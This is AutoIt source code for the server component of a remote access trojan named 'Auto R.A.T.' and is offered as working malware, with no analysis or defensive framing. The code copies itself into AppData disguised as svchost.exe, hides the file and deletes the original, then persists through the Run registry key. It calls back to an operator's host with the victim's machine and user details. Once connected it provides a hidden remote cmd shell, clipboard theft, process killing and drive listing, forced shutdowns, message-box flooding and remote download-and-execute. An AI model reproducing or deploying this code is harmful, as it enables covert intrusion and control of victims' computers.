#NoTrayIcon
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_icon=Icon_3.ico
#AutoIt3Wrapper_Compression=4
#AutoIt3Wrapper_Res_Comment= 
#AutoIt3Wrapper_Res_Description= 
#AutoIt3Wrapper_Res_Fileversion=0.1.0.0
#AutoIt3Wrapper_Res_LegalCopyright= 
#AutoIt3Wrapper_Res_requestedExecutionLevel=highestAvailable
#AutoIt3Wrapper_Run_Obfuscator=y
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#include <process.au3>
#include <misc.au3>
#include <string.au3>
#include <Constants.au3>
#include <winapi.au3>
;~ #include <array.au3>
$flood = ""
Global $title
Global $text
Global $icon
Global $cmd = 0
Global $status
;~ Global $Ursprung
Global $cmdWindowOut_Buffer
Global $schleife = 0

$dns = 0
$array = readeof()
$anzahl = 0


Switch $array[12]
	Case "Windows"
		$path = @WindowsDir
	Case "Desktop"
		$path = @DesktopDir
	Case "Appdata"
		$path = @AppDataDir
	Case "Temp"
		$path = @TempDir
	Case "MyDocuments"
		$path = @MyDocumentsDir
	Case "System32"
		$path = @SystemDir
	Case ""
		$path = @AppDataDir
	Case Else
		$path = $array[12]
EndSwitch


If $array[3] = 1 Then
	If $array[10] = "" Then $array[10] = "svchost.exe"
	If $array[11] = "" Then $array[11] = "autorat"
	If $array[12] = "" Then $array[12] = @AppDataDir
EndIf

If $array[4] = 1 And $array[3] <> 1 Then
	$array[3] = 1
	$array[10] = "svchost.exe"
	$array[11] = "autorat"
	$array[12] = @AppDataDir
EndIf


If $array[4] = 1 And @ScriptFullPath <> $path & "\" & $array[11] & "\" & $array[10] Then
	If $array[3] = 1 Then
		FileCopy(@ScriptFullPath, $path & "\" & $array[11] & "\" & $array[10], 9)
		ShellExecute($path & "\" & $array[11] & "\" & $array[10])
		_SelfDelete()
		Exit
	EndIf
EndIf

If $array[3] = 1 And @ScriptFullPath <> $path & "\" & $array[11] & "\" & $array[10] Then
	FileCopy(@ScriptFullPath, $path & "\" & $array[11] & "\" & $array[10], 9)
	ShellExecute($path & "\" & $array[11] & "\" & $array[10])
	Exit
EndIf


_Singleton($array[7], 0)
TCPStartup()
$dns = _isdns($array[0])

While 1
	If $dns = 1 Then
		$adresse = TCPNameToIP($array[0])
		Sleep(1000)
		If $adresse = "" Then ContinueLoop
		If $adresse <> "" Then ExitLoop
	Else
		$adresse = $array[0]
		ExitLoop
	EndIf
WEnd

If $array[2] = 1 Then
	RegWrite("HKCU\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN", "AutoRAT", "REG_SZ", @ScriptFullPath)
EndIf

$pw = $array[6]
$port = $array[1]


If RegRead("HKCU\SOFTWARE\AUTORAT", "NAME") = "" And @error = 1 Then
	$name = "default"
Else
	$name = RegRead("HKCU\SOFTWARE\AUTORAT", "NAME")
EndIf


If RegRead("HKCU\SOFTWARE\AUTORAT", "DNSIP") = "" And @error = 1 Then
	Sleep(1)
Else
	$adresse = _StringEncrypt(0, RegRead("HKCU\SOFTWARE\AUTORAT", "DNSIP"), "AUTORAT")
	If _isdns($adresse) = 1 Then $adresse = TCPNameToIP($adresse)
EndIf
If $array[5] = 1 Then FileSetAttrib(@ScriptFullPath, "+H", 1)

If $array[9] = 1 Then
	Opt("TrayIconHide", 0)
	TraySetToolTip("Auto R.A.T. 0.12 Beta Visible Server")
EndIf


While 1
	$bytes = 1024
	TCPShutdown ()
	TCPStartup()

	If RegRead("HKCU\SOFTWARE\AUTORAT", "DNSIP") = "" Then
		$adresse = $array[0]
		If _isdns($adresse) = 1 Then $adresse = TCPNameToIP($adresse)
	Else
		$adresse = _StringEncrypt(0, RegRead("HKCU\SOFTWARE\AUTORAT", "DNSIP"), "AUTORAT")
		If _isdns($adresse) = 1 Then $adresse = TCPNameToIP($adresse)
	EndIf
	$socket = TCPConnect($adresse, $port)
	If $socket = -1 and @error Then ContinueLoop
	TCPSend($socket, "PW=" & $pw & "IP=" & @IPAddress1 & "USERNAME=" & $name & "COMPUTER=" & @ComputerName & "/" & @UserName & "OS=" & @OSVersion)
	If @error Then ContinueLoop


	While 1
	$schleife = $schleife + 1
	if $schleife > 3 Then
	$schleife = ""
	Else
	sleep (999)
	EndIf

		If $array[2] = 1 And $array[8] = 1 Then
			If RegRead("HKCU\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN", "AutoRAT") <> @ScriptFullPath Then
				RegWrite("HKCU\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN", "AutoRAT", "REG_SZ", @ScriptFullPath)
			EndIf
		EndIf
		$anweisung = TCPRecv($socket, $bytes)
		If @error Then ContinueLoop 2

		if $anzahl > 0 and $flood = 1 then
		Run(@ScriptFullPath & ' /AutoIt3ExecuteLine "MsgBox('&$icon&', '''&$title&''', '''&$text&''')"')
		$anzahl = $anzahl - 1
		EndIf


		If $anweisung <> "" And $anweisung = "EXIT" Then Exit
		; ================================= CHANGE NAME =============================================

		If $anweisung <> "" And StringInStr($anweisung, "NAME=") > 0 Then
			RegWrite("HKCU\SOFTWARE\AUTORAT", "NAME", "REG_SZ", StringTrimLeft($anweisung, 5))
			$name = StringTrimLeft($anweisung, 5)
		EndIf

		; ==================================== CHANGE NAME ENDE =====================================


		; ==================================== NEW DNS IP =====================================


		If $anweisung <> "" And StringInStr($anweisung, "DNSIP=") > 0 Then
			RegWrite("HKCU\SOFTWARE\AUTORAT", "DNSIP", "REG_SZ", _StringEncrypt(1, StringTrimLeft($anweisung, 6), "AUTORAT"))
			$adresse = StringTrimLeft($anweisung, 6)
			If _isdns($adresse) = 1 Then $adresse = TCPNameToIP($adresse)
			ContinueLoop 2
		EndIf

		if $anweisung <> "" and StringInStr ($anweisung,"Update=") > 0 Then

		$infos = StringSplit (StringTrimLeft ($anweisung,7), "/", 1)
		$pakete = $infos[1]
		$size = $infos[2]

			Do
			$random = Random (1, 99999, 1)
			Until FileExists (@ScriptDir & "\"&$random&".exe") = 0
		TCPSend ($socket, "UPDATEOK")
		$updateexe = FileOpen (@ScriptDir & "\"&$random&".exe", 17)
		while 1
				do
				$rawpaket = TCPRecv ($socket, 1050)
				if $rawpaket = "EOU" then ExitLoop 2
			Until StringLeft ($rawpaket, 3) = "SOP" and StringRight($rawpaket, 3) = "EOP"
			$rawdata = StringTrimLeft ($rawpaket, 3)
			$rawdata = StringTrimRight ($rawdata, 3)
			FileWrite ($updateexe, $rawdata)
		TCPSend ($socket, "POK")
		WEnd
		TCPSend ($socket, "PTDONE")
		FileClose ($updateexe)
		$file2 = _WinAPI_CreateFile(@ScriptDir&"\"&$random&".exe",2,4)
		_WinAPI_SetFilePointer($file2,$size)
		_WinAPI_SetEndOfFile($file2)
		_WinAPI_CloseHandle($file2)
		run (@ScriptDir & "\"&$random&".exe")
		_SelfDelete()
		Exit

		EndIf

		; ==================================== NEW DNS IP ENDE =====================================


		; ======================== SHUTDOWN ========================

		If $anweisung <> "" And $anweisung = "SHUTDOWN" Then
			Shutdown(1)
		EndIf

		; ======================== Restart ========================

		If $anweisung <> "" And $anweisung = "RESTART" Then
			Shutdown(2)
		EndIf

		; ======================== Logoff ========================

		If $anweisung <> "" And $anweisung = "LOGOFF" Then
			Shutdown(0)
		EndIf


		; ====================== CLIPBOARD =====================

		If $anweisung <> "" And $anweisung = "GETCLIPBOARD" Then
			$clipboard = ClipGet()
			$clipboard= StringReplace($clipboard,@LF,@CRLF)
			TCPSend($socket, "CLIPBOARD=" & $clipboard)
		EndIf

		; ========== MSGBOX ========================

		if $anweisung <> "" and StringLeft ($anweisung, 7) = "MSGBOX=" Then


		$msgsettings = StringSplit ($anweisung, @CRLF, 1)

		$icon =  $msgsettings[4]
		$title = $msgsettings[2]
		$text = $msgsettings[3]
		$flood = $msgsettings[5]
		$anzahl = $msgsettings[6]




;~ 		$string1 = StringTrimLeft ($anweisung, 14)
;~ 		$pos1 = StringInStr ($string1, "\\MSGBOXTEXT=")
;~ 		$title = StringLeft ($string1, $pos1-1)
;~ 		$test2 = StringTrimLeft ($string1, $pos1 + StringLen($title)+7)
;~ 		$pos2 = StringInStr ($test2, "\\ICON=")
;~ 		$text = StringLeft ($test2, $pos2 -1)
;~ 		$pos5 = StringInStr ($anweisung, "\\ICON=")
;~ 		$test5 = StringTrimLeft ($anweisung, $pos5+6)
;~ 		$pos6 = StringInStr ($test5, "\\FLOOD=1")
;~ 		$icon = StringLeft ($test5, $pos6-1)
;~ 		$pos7 = StringInStr ($anweisung, "\\FLOOD=")
;~ 		$test7 = StringTrimLeft ($anweisung, $pos7+7)
;~ 		$flood = StringLeft ($test7, 1)
;~ 		$pos8 = StringInStr ($anweisung, "\\ANZAHL=")
;~ 		$anzahl = StringTrimLeft ($anweisung, $pos8+8)
;~ 		$icon = StringInStr ($string1, "\\ICON=")
;~ 		$new = StringTrimLeft ($string1, $icon + 6)
;~ 		$pos4 = StringInStr ($new, "\\FLOOD=")
;~ 		$icon = StringTrimRight ($new, StringLen($new) - $pos4+1)
		Run(@ScriptFullPath & ' /AutoIt3ExecuteLine "MsgBox('&$icon&', '''&$title&''', '''&$text&''')"')
		$anzahl = $anzahl - 1
		EndIf



		; =================== SET CLIPBOARD =======================

		If $anweisung <> "" And StringInStr($anweisung, "SETCLIPBOARD=") > 0 Then
			$cliptext = StringTrimLeft($anweisung, 13)
			ClipPut ($cliptext)
			$bytes = 1024
		EndIf

		if $anweisung <> "" and StringInStr ($anweisung, "SETBYTES=") > 0 Then
		$bytes = StringTrimLeft ($anweisung, 9)
		EndIf


		; ======================== Standby ========================

		If $anweisung <> "" And $anweisung = "STANDBY" Then
			Shutdown(32)
		EndIf

		; ======================== Uninstall Server ========================

		If $anweisung <> "" And $anweisung = "UNINSTALL" Then
			RegDelete("HKCU\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN", "AutoRAT")
			RegDelete("HKCU\SOFTWARE\AUTORAT")
			_SelfDelete()
			Exit
		EndIf


		; ================= UPLAOD FILE TO SERVER =========================





		; ========================= PROCESSES =================================

		If $anweisung <> "" And $anweisung = "GETPROCESSES" Then
		$string = ""
		$procceses = ProcessList()
		for $i = 1 to $procceses[0][0]
		$string = $procceses[$i][0]&"\\"&$procceses[$i][1]&"//"&$string
		Next
		TCPSend ($socket, $string)
		EndIf

		; =========================== CLOSE PROCESS ============================

		if $anweisung <> "" and StringInStr($anweisung, "CLOSEPROCESS=") > 0 Then
			ProcessClose (StringTrimLeft($anweisung, 13))
		EndIf


		; ======================== Restart Server ========================

		If $anweisung <> "" And $anweisung = "RESTART" Then
			_restart()
		EndIf

		; ========================== REMOTE SHELL INIT =========================

		if $anweisung <> "" and $anweisung = "GETCMD" Then
			if ProcessExists ($cmd) = 0 Then
			Global $cmd = Run(@Comspec,@DesktopDir,@SW_HIDE, $STDIN_CHILD + $STDOUT_CHILD + $STDERR_CHILD)
		Else
			ProcessClose ($cmd)
			Global $cmd = Run(@Comspec,@DesktopDir,@SW_HIDE, $STDIN_CHILD + $STDOUT_CHILD + $STDERR_CHILD)
		EndIf
			$Ursprung = ""
			$cmdWindowOut_Buffer = ""
			Sleep(400)
			$cmdWindowOut = StdoutRead($cmd)
			$cmdWindowErr = StderrRead($cmd)
			$cmdWindowOut_Buffer = $cmdWindowOut_Buffer & $cmdWindowOut & $cmdWindowErr
			$Ursprung = StringSplit ($cmdWindowOut, @CRLF, 1); Zur Sicherung ;)
			$Ursprung = $Ursprung[$Ursprung[0]] ; geh das mal langsam durch... dann blickst es ;)
			TCPSend ($socket, "CMD="&$cmdWindowOut)
		EndIf


		; ================== REMOTE SHELL ============================

		if $anweisung <> "" and StringLeft ($anweisung, 7) = "SETCMD=" Then
		$command = StringTrimLeft ($anweisung, 7)
		if $command = "exit" Then
		ProcessClose ($cmd)
		ContinueLoop
		EndIf
		StdinWrite($cmd, $command & @CRLF)
		$cmdWindowOut_Buffer = ""
while 1
		$cmdWindowOut = StdoutRead($cmd)
		$cmdWindowErr = StderrRead($cmd)
		$cmdWindowOut_Buffer = $cmdWindowOut_Buffer & $cmdWindowOut & $cmdWindowErr
		If @Error then Exit
		$aktuell = StringSplit ($cmdWindowOut, @CRLF, 1)
		$aktuell = $aktuell[$aktuell[0]]
		if $aktuell <> $Ursprung Then
				if StringRight ($aktuell, 1) = ">" or StringRight ($aktuell, 2) = "\>" Then
					$Ursprung = $aktuell
					ExitLoop
				EndIf
			Else
		ExitLoop
		EndIf
WEnd
		TCPSend ($socket, "RETURNCMD="&$cmdWindowOut_Buffer)
		EndIf




		; ======================== CLOSE REMOTE SHELL ==========================

		if $anweisung <> "" and $anweisung = "CLOSECMD" Then
			ProcessClose ($cmd)
		EndIf


		; ============================= FILEMANAGER =========================

		If $anweisung <> "" And $anweisung = "GETDRIVES" Then
			$drives = DriveGetDrive("all")
			$laufwerke = $drives[0] & "\\"
			For $i = 1 To $drives[0]
				$laufwerke = $laufwerke & "DRIVE" & $i & "=" & $drives[$i]
			Next
			TCPSend($socket, $laufwerke)
			If @error Then ContinueLoop 2
		EndIf

		; ================== GET PROCESS PATH =====================

		if $anweisung <> "" and StringInStr ($anweisung, "GETPROCESSPATH=") > 0 Then
		$process = StringTrimLeft ($anweisung, 15)
		TCPSend ($socket, _ProcessGetLocation ($process))
		if @error then ContinueLoop 2
		EndIf


		; ===================================== RECONNECT =========================================

		If $anweisung <> "" And $anweisung = "RECONNECT" Then

			If RegRead("HKCU\SOFTWARE\AUTORAT", "DNSIP") = "" Then

				$adresse = $array[0]
				If _isdns($adresse) = 1 Then $adresse = TCPNameToIP($adresse)
				ContinueLoop 2

			Else

				$adresse = RegRead("HKCU\SOFTWARE\AUTORAT", "DNSIP")
				If _isdns($adresse) = 1 Then $adresse = TCPNameToIP($adresse)
				ContinueLoop 2


			EndIf




		EndIf

		;====================================== RECONNECT ENDE ======================================

	WEnd ; => END TCPRecv
WEnd ; => END TCPCONNECT



Func readeof()
	$test = FileOpen(@ScriptFullPath, 0)
	$DATEI = FileRead($test)
	FileClose($test)
	If StringInStr(StringRight($DATEI, 10), "ENDEOF") = 0 Then
		Exit
	EndIf
	Dim $EOFARRAY[13]

	$EODATA2 = StringTrimLeft($DATEI, StringInStr($DATEI, "STARTEOF") - 1)
	$arrEOF = StringSplit($EODATA2, @CRLF, 1)
	$IP = StringTrimLeft($arrEOF[2], 6)
	$port = StringTrimLeft($arrEOF[3], 5)
	$autostart = StringTrimLeft($arrEOF[4], 10)
	$install = StringTrimLeft($arrEOF[5], 8)
	$melt = StringTrimLeft($arrEOF[6], 5)
	$hidden = StringTrimLeft($arrEOF[7], 7)
	$password = StringTrimLeft($arrEOF[8], 9)
	$mutex = StringTrimLeft($arrEOF[9], 6)
	$persistant = StringTrimLeft($arrEOF[10], 11)
	$visible = StringTrimLeft($arrEOF[11], 8)
	$filename = StringTrimLeft($arrEOF[12], 9)
	$folder = StringTrimLeft($arrEOF[13], 7)
	$path = StringTrimLeft($arrEOF[14], 5)


	If $IP = "localhost" or $IP = "127.0.0.1" Then
	$EOFARRAY[0] = @ComputerName
Else
	$EOFARRAY[0] = $IP
	EndIf


	$EOFARRAY[1] = $port
	$EOFARRAY[2] = $autostart
	$EOFARRAY[3] = $install
	$EOFARRAY[4] = $melt
	$EOFARRAY[5] = $hidden
	$EOFARRAY[6] = $password
	$EOFARRAY[7] = $mutex
	$EOFARRAY[8] = $persistant
	$EOFARRAY[9] = $visible
	$EOFARRAY[10] = $filename
	$EOFARRAY[11] = $folder
	$EOFARRAY[12] = $path

	Return $EOFARRAY

EndFunc   ;==>readeof

Func _isdns($adress)

	$dns = 0

	$newarray = StringSplit($adress, ".")
	For $k = 0 To UBound($newarray) - 1
		If StringIsAlNum($newarray[$k]) = 0 And $newarray[$k] <> "." Then
			$dns = 1
			ExitLoop
		EndIf
	Next
	Return $dns

EndFunc   ;==>_isdns

Func _SelfDelete($iDelay = 0)
	Local $sCmdFile
	FileDelete(@TempDir & "\scratch.bat")
	$sCmdFile = 'ping -n ' & $iDelay & '127.0.0.1 > nul' & @CRLF _
			 & ':loop' & @CRLF _
			 & 'del "' & @ScriptFullPath & '"' & @CRLF _
			 & 'if exist "' & @ScriptFullPath & '" goto loop' & @CRLF _
			 & 'del ' & @TempDir & '\scratch.bat'
	FileWrite(@TempDir & "\scratch.bat", $sCmdFile)
	Run(@TempDir & "\scratch.bat", @TempDir, @SW_HIDE)
EndFunc   ;==>_SelfDelete

Func _restart()
	If @Compiled = 1 Then
		Run(FileGetShortName(@ScriptFullPath))
	Else
		Run(FileGetShortName(@AutoItExe) & " " & FileGetShortName(@ScriptFullPath))
	EndIf
	Exit
EndFunc   ;==>_restart

Func _ProcessGetLocation($sProc = @ScriptFullPath)
    Local $iPID = ProcessExists($sProc)
    If $iPID = 0 Then Return SetError(1, 0, -1)

    Local $aProc = DllCall('kernel32.dll', 'hwnd', 'OpenProcess', 'int', BitOR(0x0400, 0x0010), 'int', 0, 'int', $iPID)
    If $aProc[0] = 0 Then Return SetError(1, 0, -1)

    Local $vStruct = DllStructCreate('int[1024]')
    DllCall('psapi.dll', 'int', 'EnumProcessModules', 'hwnd', $aProc[0], 'ptr', DllStructGetPtr($vStruct), 'int', DllStructGetSize($vStruct), 'int*', 0)

    Local $aReturn = DllCall('psapi.dll', 'int', 'GetModuleFileNameEx', 'hwnd', $aProc[0], 'int', DllStructGetData($vStruct, 1), 'str', '', 'int', 2048)
    If StringLen($aReturn[3]) = 0 Then Return SetError(2, 0, '')
    Return $aReturn[3]
EndFunc
